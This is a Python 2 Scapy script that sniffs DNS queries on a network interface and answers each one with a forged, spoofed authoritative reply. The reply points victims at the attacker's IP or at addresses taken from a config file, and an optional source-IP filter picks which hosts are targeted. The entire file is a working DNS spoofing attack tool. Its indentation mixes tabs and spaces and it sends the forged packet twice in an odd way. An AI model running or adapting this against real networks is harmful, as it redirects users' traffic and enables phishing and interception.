#! /usr/bin/python

from scapy.all import *
import sys, getopt
import os
import os.path
import ConfigParser
import socket

ifile = ''
bpf= ''
interface= ''

import socket
import fcntl
import struct

def get_ip_address(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915, struct.pack('256s', ifname[:15]))[20:24])


def querysniff(pkt):
	#print ifile
	val=''
	ipaddr=get_ip_address(interface)
	#print ipaddr	

	if IP in pkt:
                ip_src = pkt[IP].src
                ip_dst = pkt[IP].dst
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
                        #print str(ip_src) + " -> " + str(ip_dst) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"
			
			if bpf:
				bpflist=bpf.split(',')
				if ip_src not in bpflist:
					return

			if os.path.isfile(ifile):
				config = ConfigParser.RawConfigParser()
				config.read(ifile)
				try:
					domainname=pkt.getlayer(DNS).qd.qname[:-1]
					val=config.get('database', domainname);
				except:
					val=ipaddr
					pass
			else:
				val=ipaddr
                        s_packet=sr1(IP(src=ip_dst, dst=ip_src)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, qr=1, aa=1, ancount=1, qdcount=1, an=DNSRR(rrname=pkt[DNSQR].qname, type="A", ttl=120, rdata=val)))
			print "\nPacket created and sent!"
                        send(s_packet)
                        #print s_packet[DNS].summary()


def main(argv):
   global interface
   global ifile
   try:
      opts, args = getopt.getopt(argv,"hi:f:",["interface=","ifile="])
   except getopt.GetoptError:
      print 'test.py -i <interface> -f <file>'
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print 'test.py -i <interface> -f <file>'
         sys.exit()
      elif opt in ("-i", "--interface"):
         interface = arg
      elif opt in ("-f", "--ifile"):
         ifile = arg
   #print 'Interface is ', interface
   #print 'file is ', ifile
   
   global bpf
   if(len(sys.argv)==4):
   	bpf=sys.argv[3]
   elif(len(sys.argv)==6):
	bpf=sys.argv[5]
   #print bpf
   return interface

if __name__ == "__main__":
	interface=main(sys.argv[1:])
	sniff(iface = interface,filter = "udp and port 53", prn = querysniff, store = 0)
	print "\nShutting Down..."

